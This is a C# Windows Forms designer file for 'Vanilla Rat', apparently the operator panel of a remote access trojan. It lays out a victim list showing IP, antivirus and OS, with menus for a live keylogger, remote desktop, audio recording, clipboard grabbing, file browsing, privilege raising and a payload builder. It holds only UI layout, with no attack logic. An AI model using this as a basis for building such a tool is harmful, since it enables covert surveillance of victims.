namespace VanillaRat
{
    partial class Main
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.ClientMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.btnStartServer = new System.Windows.Forms.Button();
            this.btnStopServer = new System.Windows.Forms.Button();
            this.btnSettings = new System.Windows.Forms.Button();
            this.btnBuilder = new System.Windows.Forms.Button();
            this.lblStatus = new System.Windows.Forms.Label();
            this.GetDataLoop = new System.Windows.Forms.Timer(this.components);
            this.bwUpdateImage = new System.ComponentModel.BackgroundWorker();
            this.panel1 = new System.Windows.Forms.Panel();
            this.lbConnectedClients = new System.Windows.Forms.ListView();
            this.chConnectionId = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.chIP = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.chTag = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.SidebarPanel = new System.Windows.Forms.Panel();
            this.lblVersion = new System.Windows.Forms.Label();
            this.chAntiVirus = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.chOperatingSystem = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lblCurrentID = new System.Windows.Forms.ToolStripMenuItem();
            this.clientControlsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.btnClientKill = new System.Windows.Forms.ToolStripMenuItem();
            this.btnClientDisconnect = new System.Windows.Forms.ToolStripMenuItem();
            this.btnShowClientConsole = new System.Windows.Forms.ToolStripMenuItem();
            this.btnRaisePerms = new System.Windows.Forms.ToolStripMenuItem();
            this.clientCommunicationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.btnOpenMessageBoxDialog = new System.Windows.Forms.ToolStripMenuItem();
            this.headerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.txtHeader = new System.Windows.Forms.ToolStripTextBox();
            this.messageToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.txtMessage = new System.Windows.Forms.ToolStripTextBox();
            this.buttonsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cbButtons = new System.Windows.Forms.ToolStripComboBox();
            this.iconToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cbIcons = new System.Windows.Forms.ToolStripComboBox();
            this.btnSendMessageBox = new System.Windows.Forms.ToolStripMenuItem();
            this.btnPreviewMessage = new System.Windows.Forms.ToolStripMenuItem();
            this.clientToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.btnGetRunningApps = new System.Windows.Forms.ToolStripMenuItem();
            this.btnOpenComputerInfo = new System.Windows.Forms.ToolStripMenuItem();
            this.btnOpenFileBrowser = new System.Windows.Forms.ToolStripMenuItem();
            this.btnGrabClipboard = new System.Windows.Forms.ToolStripMenuItem();
            this.btnGetHardwareUsage = new System.Windows.Forms.ToolStripMenuItem();
            this.clientExtrasToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.btnOpenWebsite = new System.Windows.Forms.ToolStripMenuItem();
            this.btnStartLiveKeylogger = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteDesktopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.btnStartRemoteDesktop = new System.Windows.Forms.ToolStripMenuItem();
            this.btnStopRemoteDesktop = new System.Windows.Forms.ToolStripMenuItem();
            this.btnAudioRecorder = new System.Windows.Forms.ToolStripMenuItem();
            this.ClientMenu.SuspendLayout();
            this.panel1.SuspendLayout();
            this.SidebarPanel.SuspendLayout();
            this.SuspendLayout();
            // 
            // ClientMenu
            // 
            this.ClientMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.lblCurrentID,
            this.clientControlsToolStripMenuItem,
            this.clientCommunicationToolStripMenuItem,
            this.clientToolStripMenuItem,
            this.clientExtrasToolStripMenuItem});
            this.ClientMenu.Name = "ClientMenu";
            this.ClientMenu.Size = new System.Drawing.Size(202, 114);
            // 
            // btnStartServer
            // 
            this.btnStartServer.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(99)))), ((int)(((byte)(110)))), ((int)(((byte)(114)))));
            this.btnStartServer.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btnStartServer.Font = new System.Drawing.Font("Trebuchet MS", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnStartServer.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(223)))), ((int)(((byte)(230)))), ((int)(((byte)(233)))));
            this.btnStartServer.Location = new System.Drawing.Point(12, 11);
            this.btnStartServer.Name = "btnStartServer";
            this.btnStartServer.Size = new System.Drawing.Size(146, 38);
            this.btnStartServer.TabIndex = 1;
            this.btnStartServer.Text = "START SERVER";
            this.btnStartServer.UseVisualStyleBackColor = true;
            this.btnStartServer.Click += new System.EventHandler(this.btnStartServer_Click);
            // 
            // btnStopServer
            // 
            this.btnStopServer.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(99)))), ((int)(((byte)(110)))), ((int)(((byte)(114)))));
            this.btnStopServer.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btnStopServer.Font = new System.Drawing.Font("Trebuchet MS", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnStopServer.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(223)))), ((int)(((byte)(230)))), ((int)(((byte)(233)))));
            this.btnStopServer.Location = new System.Drawing.Point(12, 55);
            this.btnStopServer.Name = "btnStopServer";
            this.btnStopServer.Size = new System.Drawing.Size(146, 38);
            this.btnStopServer.TabIndex = 2;
            this.btnStopServer.Text = "STOP SERVER";
            this.btnStopServer.UseVisualStyleBackColor = true;
            this.btnStopServer.Click += new System.EventHandler(this.btnStopServer_Click);
            // 
            // btnSettings
            // 
            this.btnSettings.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(99)))), ((int)(((byte)(110)))), ((int)(((byte)(114)))));
            this.btnSettings.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btnSettings.Font = new System.Drawing.Font("Trebuchet MS", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnSettings.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(223)))), ((int)(((byte)(230)))), ((int)(((byte)(233)))));
            this.btnSettings.Location = new System.Drawing.Point(12, 143);
            this.btnSettings.Name = "btnSettings";
            this.btnSettings.Size = new System.Drawing.Size(146, 38);
            this.btnSettings.TabIndex = 3;
            this.btnSettings.Text = "SETTINGS";
            this.btnSettings.UseVisualStyleBackColor = true;
            this.btnSettings.Click += new System.EventHandler(this.btnSettings_Click);
            // 
            // btnBuilder
            // 
            this.btnBuilder.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(99)))), ((int)(((byte)(110)))), ((int)(((byte)(114)))));
            this.btnBuilder.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btnBuilder.Font = new System.Drawing.Font("Trebuchet MS", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnBuilder.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(223)))), ((int)(((byte)(230)))), ((int)(((byte)(233)))));
            this.btnBuilder.Location = new System.Drawing.Point(12, 99);
            this.btnBuilder.Name = "btnBuilder";
            this.btnBuilder.Size = new System.Drawing.Size(146, 38);
            this.btnBuilder.TabIndex = 4;
            this.btnBuilder.Text = "BUILDER";
            this.btnBuilder.UseVisualStyleBackColor = true;
            this.btnBuilder.Click += new System.EventHandler(this.btnBuilder_Click);
            // 
            // lblStatus
            // 
            this.lblStatus.AutoSize = true;
            this.lblStatus.Location = new System.Drawing.Point(258, 323);
            this.lblStatus.Name = "lblStatus";
            this.lblStatus.Size = new System.Drawing.Size(47, 13);
            this.lblStatus.TabIndex = 5;
            this.lblStatus.Text = "lblStatus";
            // 
            // GetDataLoop
            // 
            this.GetDataLoop.Interval = 200;
            this.GetDataLoop.Tick += new System.EventHandler(this.GetDataLoop_Tick);
            // 
            // bwUpdateImage
            // 
            this.bwUpdateImage.WorkerSupportsCancellation = true;
            this.bwUpdateImage.DoWork += new System.ComponentModel.DoWorkEventHandler(this.bwUpdateImage_DoWork);
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.SystemColors.Window;
            this.panel1.Controls.Add(this.lbConnectedClients);
            this.panel1.Location = new System.Drawing.Point(165, 0);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(733, 437);
            this.panel1.TabIndex = 7;
            // 
            // lbConnectedClients
            // 
            this.lbConnectedClients.BackColor = System.Drawing.SystemColors.Window;
            this.lbConnectedClients.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.lbConnectedClients.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.chConnectionId,
            this.chIP,
            this.chTag,
            this.chAntiVirus,
            this.chOperatingSystem});
            this.lbConnectedClients.ContextMenuStrip = this.ClientMenu;
            this.lbConnectedClients.FullRowSelect = true;
            this.lbConnectedClients.GridLines = true;
            this.lbConnectedClients.Location = new System.Drawing.Point(6, -1);
            this.lbConnectedClients.MultiSelect = false;
            this.lbConnectedClients.Name = "lbConnectedClients";
            this.lbConnectedClients.Size = new System.Drawing.Size(730, 437);
            this.lbConnectedClients.TabIndex = 0;
            this.lbConnectedClients.UseCompatibleStateImageBehavior = false;
            this.lbConnectedClients.View = System.Windows.Forms.View.Details;
            this.lbConnectedClients.ColumnWidthChanging += new System.Windows.Forms.ColumnWidthChangingEventHandler(this.listView1_ColumnWidthChanging);
            this.lbConnectedClients.SelectedIndexChanged += new System.EventHandler(this.lbConnectedClients_SelectedIndexChanged);
            // 
            // chConnectionId
            // 
            this.chConnectionId.Text = "ID";
            this.chConnectionId.Width = 65;
            // 
            // chIP
            // 
            this.chIP.Text = "IP Address";
            this.chIP.Width = 162;
            // 
            // chTag
            // 
            this.chTag.Text = "Client Tag";
            this.chTag.Width = 162;
            // 
            // SidebarPanel
            // 
            this.SidebarPanel.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(52)))), ((int)(((byte)(54)))));
            this.SidebarPanel.Controls.Add(this.lblVersion);
            this.SidebarPanel.Controls.Add(this.btnStopServer);
            this.SidebarPanel.Controls.Add(this.btnStartServer);
            this.SidebarPanel.Controls.Add(this.btnBuilder);
            this.SidebarPanel.Controls.Add(this.btnSettings);
            this.SidebarPanel.Dock = System.Windows.Forms.DockStyle.Left;
            this.SidebarPanel.Location = new System.Drawing.Point(0, 0);
            this.SidebarPanel.Name = "SidebarPanel";
            this.SidebarPanel.Size = new System.Drawing.Size(171, 437);
            this.SidebarPanel.TabIndex = 8;
            // 
            // lblVersion
            // 
            this.lblVersion.AutoSize = true;
            this.lblVersion.Font = new System.Drawing.Font("Trebuchet MS", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lblVersion.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(223)))), ((int)(((byte)(230)))), ((int)(((byte)(233)))));
            this.lblVersion.Location = new System.Drawing.Point(8, 411);
            this.lblVersion.Name = "lblVersion";
            this.lblVersion.Size = new System.Drawing.Size(30, 16);
            this.lblVersion.TabIndex = 9;
            this.lblVersion.Text = "v1.3";
            this.lblVersion.Click += new System.EventHandler(this.lblVersion_Click);
            // 
            // chAntiVirus
            // 
            this.chAntiVirus.Text = "Anti-Virus";
            this.chAntiVirus.Width = 162;
            // 
            // chOperatingSystem
            // 
            this.chOperatingSystem.Text = "Operating System";
            this.chOperatingSystem.Width = 162;
            // 
            // lblCurrentID
            // 
            this.lblCurrentID.Image = global::VanillaRat.Properties.Resources.Person_48px;
            this.lblCurrentID.Name = "lblCurrentID";
            this.lblCurrentID.Size = new System.Drawing.Size(201, 22);
            this.lblCurrentID.Text = "Client ID: None Selected";
            // 
            // clientControlsToolStripMenuItem
            // 
            this.clientControlsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.btnClientKill,
            this.btnClientDisconnect,
            this.btnShowClientConsole,
            this.btnRaisePerms});
            this.clientControlsToolStripMenuItem.Image = global::VanillaRat.Properties.Resources.Services_48px;
            this.clientControlsToolStripMenuItem.Name = "clientControlsToolStripMenuItem";
            this.clientControlsToolStripMenuItem.Size = new System.Drawing.Size(214, 22);
            this.clientControlsToolStripMenuItem.Text = "Client Controls";
            // 
            // btnClientKill
            // 
            this.btnClientKill.Image = global::VanillaRat.Properties.Resources.Close_Window_48px;
            this.btnClientKill.Name = "btnClientKill";
            this.btnClientKill.Size = new System.Drawing.Size(262, 22);
            this.btnClientKill.Text = "Kill Process (Won\'t Come Back)";
            this.btnClientKill.Click += new System.EventHandler(this.btnClientKill_Click);
            // 
            // btnClientDisconnect
            // 
            this.btnClientDisconnect.Image = global::VanillaRat.Properties.Resources.Disconnected_48px;
            this.btnClientDisconnect.Name = "btnClientDisconnect";
            this.btnClientDisconnect.Size = new System.Drawing.Size(262, 22);
            this.btnClientDisconnect.Text = "Disconnect (Will Reconnect)";
            this.btnClientDisconnect.Click += new System.EventHandler(this.btnClientDisconnect_Click);
            // 
            // btnShowClientConsole
            // 
            this.btnShowClientConsole.Image = global::VanillaRat.Properties.Resources.Console_48px;
            this.btnShowClientConsole.Name = "btnShowClientConsole";
            this.btnShowClientConsole.Size = new System.Drawing.Size(262, 22);
            this.btnShowClientConsole.Text = "Show Console";
            this.btnShowClientConsole.Click += new System.EventHandler(this.btnShowClientConsole_Click);
            // 
            // btnRaisePerms
            // 
            this.btnRaisePerms.Image = global::VanillaRat.Properties.Resources.Double_Up_48px;
            this.btnRaisePerms.Name = "btnRaisePerms";
            this.btnRaisePerms.Size = new System.Drawing.Size(262, 22);
            this.btnRaisePerms.Text = "Raise Permission Level (Will Restart)";
            this.btnRaisePerms.Click += new System.EventHandler(this.btnRaisePerms_Click);
            // 
            // clientCommunicationToolStripMenuItem
            // 
            this.clientCommunicationToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.btnOpenMessageBoxDialog});
            this.clientCommunicationToolStripMenuItem.Image = global::VanillaRat.Properties.Resources.Communication_48px;
            this.clientCommunicationToolStripMenuItem.Name = "clientCommunicationToolStripMenuItem";
            this.clientCommunicationToolStripMenuItem.Size = new System.Drawing.Size(214, 22);
            this.clientCommunicationToolStripMenuItem.Text = "Client Communication";
            // 
            // btnOpenMessageBoxDialog
            // 
            this.btnOpenMessageBoxDialog.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.headerToolStripMenuItem,
            this.messageToolStripMenuItem,
            this.buttonsToolStripMenuItem,
            this.iconToolStripMenuItem,
            this.btnSendMessageBox,
            this.btnPreviewMessage});
            this.btnOpenMessageBoxDialog.Image = global::VanillaRat.Properties.Resources.Paper_Plane_48px;
            this.btnOpenMessageBoxDialog.Name = "btnOpenMessageBoxDialog";
            this.btnOpenMessageBoxDialog.Size = new System.Drawing.Size(171, 22);
            this.btnOpenMessageBoxDialog.Text = "Send Message Box";
            // 
            // headerToolStripMenuItem
            // 
            this.headerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.txtHeader});
            this.headerToolStripMenuItem.Name = "headerToolStripMenuItem";
            this.headerToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.headerToolStripMenuItem.Text = "Header";
            // 
            // txtHeader
            // 
            this.txtHeader.Name = "txtHeader";
            this.txtHeader.Size = new System.Drawing.Size(100, 23);
            // 
            // messageToolStripMenuItem
            // 
            this.messageToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.txtMessage});
            this.messageToolStripMenuItem.Name = "messageToolStripMenuItem";
            this.messageToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.messageToolStripMenuItem.Text = "Message ";
            // 
            // txtMessage
            // 
            this.txtMessage.Name = "txtMessage";
            this.txtMessage.Size = new System.Drawing.Size(100, 23);
            // 
            // buttonsToolStripMenuItem
            // 
            this.buttonsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cbButtons});
            this.buttonsToolStripMenuItem.Name = "buttonsToolStripMenuItem";
            this.buttonsToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.buttonsToolStripMenuItem.Text = "Buttons";
            // 
            // cbButtons
            // 
            this.cbButtons.Items.AddRange(new object[] {
            "Abort Retry Ignore",
            "OK",
            "OK Cancel",
            "Retry Cancel",
            "Yes No",
            "Yes No Cancel"});
            this.cbButtons.Name = "cbButtons";
            this.cbButtons.Size = new System.Drawing.Size(121, 23);
            // 
            // iconToolStripMenuItem
            // 
            this.iconToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cbIcons});
            this.iconToolStripMenuItem.Name = "iconToolStripMenuItem";
            this.iconToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.iconToolStripMenuItem.Text = "Icon";
            // 
            // cbIcons
            // 
            this.cbIcons.Items.AddRange(new object[] {
            "Asterisk",
            "Error",
            "Exclamation ",
            "Hand",
            "Information",
            "None",
            "Question",
            "Stop",
            "Warning"});
            this.cbIcons.Name = "cbIcons";
            this.cbIcons.Size = new System.Drawing.Size(121, 23);
            // 
            // btnSendMessageBox
            // 
            this.btnSendMessageBox.Name = "btnSendMessageBox";
            this.btnSendMessageBox.Size = new System.Drawing.Size(164, 22);
            this.btnSendMessageBox.Text = "Send Message";
            this.btnSendMessageBox.Click += new System.EventHandler(this.btnSendMessageBox_Click);
            // 
            // btnPreviewMessage
            // 
            this.btnPreviewMessage.Name = "btnPreviewMessage";
            this.btnPreviewMessage.Size = new System.Drawing.Size(164, 22);
            this.btnPreviewMessage.Text = "Preview Message";
            this.btnPreviewMessage.Click += new System.EventHandler(this.btnPreviewMessage_Click);
            // 
            // clientToolStripMenuItem
            // 
            this.clientToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.btnGetRunningApps,
            this.btnOpenComputerInfo,
            this.btnOpenFileBrowser,
            this.btnGrabClipboard,
            this.btnGetHardwareUsage});
            this.clientToolStripMenuItem.Image = global::VanillaRat.Properties.Resources.Info_48px;
            this.clientToolStripMenuItem.Name = "clientToolStripMenuItem";
            this.clientToolStripMenuItem.Size = new System.Drawing.Size(214, 22);
            this.clientToolStripMenuItem.Text = "Client Information";
            // 
            // btnGetRunningApps
            // 
            this.btnGetRunningApps.Image = global::VanillaRat.Properties.Resources.Windows_Client_48px;
            this.btnGetRunningApps.Name = "btnGetRunningApps";
            this.btnGetRunningApps.Size = new System.Drawing.Size(209, 22);
            this.btnGetRunningApps.Text = "Get Running Applications";
            this.btnGetRunningApps.Click += new System.EventHandler(this.btnGetRunningApps_Click);
            // 
            // btnOpenComputerInfo
            // 
            this.btnOpenComputerInfo.Image = global::VanillaRat.Properties.Resources.Laptop_48px;
            this.btnOpenComputerInfo.Name = "btnOpenComputerInfo";
            this.btnOpenComputerInfo.Size = new System.Drawing.Size(209, 22);
            this.btnOpenComputerInfo.Text = "Get Computer Info";
            this.btnOpenComputerInfo.Click += new System.EventHandler(this.btnOpenComputerInfo_Click);
            // 
            // btnOpenFileBrowser
            // 
            this.btnOpenFileBrowser.Image = global::VanillaRat.Properties.Resources.Opened_Folder_48px;
            this.btnOpenFileBrowser.Name = "btnOpenFileBrowser";
            this.btnOpenFileBrowser.Size = new System.Drawing.Size(209, 22);
            this.btnOpenFileBrowser.Text = "Open File Browser";
            this.btnOpenFileBrowser.Click += new System.EventHandler(this.btnOpenFileBrowser_Click);
            // 
            // btnGrabClipboard
            // 
            this.btnGrabClipboard.Image = global::VanillaRat.Properties.Resources.Document_48px;
            this.btnGrabClipboard.Name = "btnGrabClipboard";
            this.btnGrabClipboard.Size = new System.Drawing.Size(209, 22);
            this.btnGrabClipboard.Text = "Get Clipboard Text ";
            this.btnGrabClipboard.Click += new System.EventHandler(this.btnGrabClipboard_Click);
            // 
            // btnGetHardwareUsage
            // 
            this.btnGetHardwareUsage.Image = global::VanillaRat.Properties.Resources.Server_48px;
            this.btnGetHardwareUsage.Name = "btnGetHardwareUsage";
            this.btnGetHardwareUsage.Size = new System.Drawing.Size(209, 22);
            this.btnGetHardwareUsage.Text = "Get Hardware Usage";
            this.btnGetHardwareUsage.Click += new System.EventHandler(this.btnGetHardwareUsage_Click);
            // 
            // clientExtrasToolStripMenuItem
            // 
            this.clientExtrasToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.btnOpenWebsite,
            this.btnStartLiveKeylogger,
            this.remoteDesktopToolStripMenuItem,
            this.btnAudioRecorder});
            this.clientExtrasToolStripMenuItem.Image = global::VanillaRat.Properties.Resources.Flash_On_48px;
            this.clientExtrasToolStripMenuItem.Name = "clientExtrasToolStripMenuItem";
            this.clientExtrasToolStripMenuItem.Size = new System.Drawing.Size(214, 22);
            this.clientExtrasToolStripMenuItem.Text = "Client Extras ";
            // 
            // btnOpenWebsite
            // 
            this.btnOpenWebsite.Image = global::VanillaRat.Properties.Resources.Website_48px;
            this.btnOpenWebsite.Name = "btnOpenWebsite";
            this.btnOpenWebsite.Size = new System.Drawing.Size(178, 22);
            this.btnOpenWebsite.Text = "Open Website ";
            this.btnOpenWebsite.Click += new System.EventHandler(this.btnOpenWebsite_Click);
            // 
            // btnStartLiveKeylogger
            // 
            this.btnStartLiveKeylogger.Image = global::VanillaRat.Properties.Resources.Compose_48px;
            this.btnStartLiveKeylogger.Name = "btnStartLiveKeylogger";
            this.btnStartLiveKeylogger.Size = new System.Drawing.Size(178, 22);
            this.btnStartLiveKeylogger.Text = "Start Live Keylogger";
            this.btnStartLiveKeylogger.Click += new System.EventHandler(this.btnStartLiveKeylogger_Click);
            // 
            // remoteDesktopToolStripMenuItem
            // 
            this.remoteDesktopToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.btnStartRemoteDesktop,
            this.btnStopRemoteDesktop});
            this.remoteDesktopToolStripMenuItem.Image = global::VanillaRat.Properties.Resources.Monitor_48px;
            this.remoteDesktopToolStripMenuItem.Name = "remoteDesktopToolStripMenuItem";
            this.remoteDesktopToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
            this.remoteDesktopToolStripMenuItem.Text = "Remote Desktop";
            // 
            // btnStartRemoteDesktop
            // 
            this.btnStartRemoteDesktop.Image = global::VanillaRat.Properties.Resources.Play_48px;
            this.btnStartRemoteDesktop.Name = "btnStartRemoteDesktop";
            this.btnStartRemoteDesktop.Size = new System.Drawing.Size(188, 22);
            this.btnStartRemoteDesktop.Text = "Start Remote Desktop";
            this.btnStartRemoteDesktop.Click += new System.EventHandler(this.btnStartRemoteDesktop_Click);
            // 
            // btnStopRemoteDesktop
            // 
            this.btnStopRemoteDesktop.Image = global::VanillaRat.Properties.Resources.Close_Window_48px2;
            this.btnStopRemoteDesktop.Name = "btnStopRemoteDesktop";
            this.btnStopRemoteDesktop.Size = new System.Drawing.Size(188, 22);
            this.btnStopRemoteDesktop.Text = "Stop Remote Desktop";
            this.btnStopRemoteDesktop.Click += new System.EventHandler(this.btnStopRemoteDesktop_Click);
            // 
            // btnAudioRecorder
            // 
            this.btnAudioRecorder.Image = global::VanillaRat.Properties.Resources.Headphones_48px;
            this.btnAudioRecorder.Name = "btnAudioRecorder";
            this.btnAudioRecorder.Size = new System.Drawing.Size(178, 22);
            this.btnAudioRecorder.Text = "Audio Recorder";
            this.btnAudioRecorder.Click += new System.EventHandler(this.btnAudioRecorder_Click);
            // 
            // Main
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.SystemColors.Control;
            this.ClientSize = new System.Drawing.Size(898, 437);
            this.Controls.Add(this.SidebarPanel);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.lblStatus);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.Name = "Main";
            this.ShowIcon = false;
            this.Text = "Vanilla Rat";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Main_FormClosing);
            this.Load += new System.EventHandler(this.Main_Load);
            this.ClientMenu.ResumeLayout(false);
            this.panel1.ResumeLayout(false);
            this.SidebarPanel.ResumeLayout(false);
            this.SidebarPanel.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion
        private System.Windows.Forms.Button btnStartServer;
        private System.Windows.Forms.Button btnStopServer;
        private System.Windows.Forms.Button btnSettings;
        private System.Windows.Forms.Button btnBuilder;
        private System.Windows.Forms.Label lblStatus;
        private System.Windows.Forms.Timer GetDataLoop;
        private System.Windows.Forms.ContextMenuStrip ClientMenu;
        private System.Windows.Forms.ToolStripMenuItem clientControlsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem btnClientKill;
        private System.Windows.Forms.ToolStripMenuItem btnClientDisconnect;
        private System.Windows.Forms.ToolStripMenuItem btnShowClientConsole;
        private System.Windows.Forms.ToolStripMenuItem clientCommunicationToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem btnOpenMessageBoxDialog;
        private System.Windows.Forms.ToolStripMenuItem headerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem messageToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem buttonsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem iconToolStripMenuItem;
        private System.Windows.Forms.ToolStripTextBox txtHeader;
        private System.Windows.Forms.ToolStripTextBox txtMessage;
        private System.Windows.Forms.ToolStripComboBox cbButtons;
        private System.Windows.Forms.ToolStripComboBox cbIcons;
        private System.Windows.Forms.ToolStripMenuItem btnSendMessageBox;
        private System.Windows.Forms.ToolStripMenuItem btnPreviewMessage;
        private System.ComponentModel.BackgroundWorker bwUpdateImage;
        private System.Windows.Forms.ToolStripMenuItem clientToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem btnGetRunningApps;
        private System.Windows.Forms.ToolStripMenuItem clientExtrasToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem btnOpenWebsite;
        private System.Windows.Forms.ToolStripMenuItem btnOpenComputerInfo;
        private System.Windows.Forms.ToolStripMenuItem btnRaisePerms;
        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.ToolStripMenuItem btnOpenFileBrowser;
        private System.Windows.Forms.ListView lbConnectedClients;
        private System.Windows.Forms.ColumnHeader chConnectionId;
        private System.Windows.Forms.ColumnHeader chIP;
        private System.Windows.Forms.ColumnHeader chTag;
        private System.Windows.Forms.ToolStripMenuItem btnGrabClipboard;
        private System.Windows.Forms.ToolStripMenuItem btnGetHardwareUsage;
        private System.Windows.Forms.ToolStripMenuItem btnStartLiveKeylogger;
        private System.Windows.Forms.ToolStripMenuItem remoteDesktopToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem btnStartRemoteDesktop;
        private System.Windows.Forms.ToolStripMenuItem btnStopRemoteDesktop;
        private System.Windows.Forms.Panel SidebarPanel;
        private System.Windows.Forms.Label lblVersion;
        private System.Windows.Forms.ToolStripMenuItem btnAudioRecorder;
        private System.Windows.Forms.ColumnHeader chAntiVirus;
        private System.Windows.Forms.ColumnHeader chOperatingSystem;
        private System.Windows.Forms.ToolStripMenuItem lblCurrentID;
    }
}

